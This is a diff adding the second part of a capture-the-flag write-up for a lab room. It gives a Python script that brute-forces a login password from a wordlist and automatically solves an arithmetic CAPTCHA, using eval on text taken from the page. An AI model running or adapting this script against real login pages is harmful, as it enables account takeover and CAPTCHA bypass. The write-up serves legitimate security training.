@@ -95,3 +95,93 @@ with open('usernames.txt', 'r') as uf:
 
 ```
 </details>
+
+This will take about two minutes to finish. Correct username will be printed to the console. 
+
+Next we have to take the correct username and create another script where we brute force to find the correct password.
+In this script we must:
+* Load the passwords from the password.txt file provided in the room. 
+* Loop through all the passwords sending the username, password and captcha in the request payload. 
+* if response returns the string "Too many bad login attempts" in the response text we know the password is unsuccessful so we can continue
+* When the repsone text does not contain too many bad login attempts as a string we know that weve found the correct password 
+* Print correct password and username to console and exit program. 
+
+<details>
+<summary>Code</summary>
+
+```
+import requests
+import re
+
+url = '' # replace with the URL of the login page
+
+with open('passwords.txt', 'r') as pf:
+        for password in pf:
+            username = "" # The password you obtained from username script
+            password = password.strip()
+            
+            payload = {
+                "username" : username,
+                "password" : password
+            }
+
+
+            response = requests.post(url, data=payload)
+            
+            # Send the GET request and extract the CAPTCHA string if present
+            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
+            print(captcha_match)
+            captcha_text = ''
+            if captcha_match is not None:
+                captcha_text = captcha_match.group(0).replace('=', '').strip()
+                print("CAPTCHA text:", captcha_text)
+
+                # Solve the CAPTCHA and include the solution in the payload
+                # num1, operator, num2 = re.findall('\d+|\D+', captcha_text)
+                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
+                if match:
+                    num1, operator, num2 = match.groups()
+                    solution = eval(num1 + operator + num2)
+                    print("Solution:", solution)
+                    payload = {
+                        'username': username,
+                        'password': password,
+                        'captcha': solution
+                    }
+                else:
+                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
+                    payload = None
+            else:
+                print("No CAPTCHA found on the page")
+                payload = {
+                    'username': username,
+                    'password': password
+                }
+
+            # Send the POST request with the payload if it is not None
+            if payload is not None:
+                response = requests.post(url, data=payload)
+                if "Too many bad login attempts!" in response.text:
+                    print(f"Attempted login with username as: {username} and password as: {password}")
+                else:
+                    print(f"The correct username is: {username} and password is: {password}")
+                    exit()
+            else:
+                print("Empty payload, cannot send request")
+
+```
+</details>
+At this point we can go to the browser using the username and password to obtain the flag to complete the room. Hope this helps someone. Happy hacking
+
+
+
+
+
+
+![capture-completed](https://user-images.githubusercontent.com/25124463/236889555-c44067f1-4066-4135-8c5f-71bb841fa410.png)
+
+
+
+
+
+
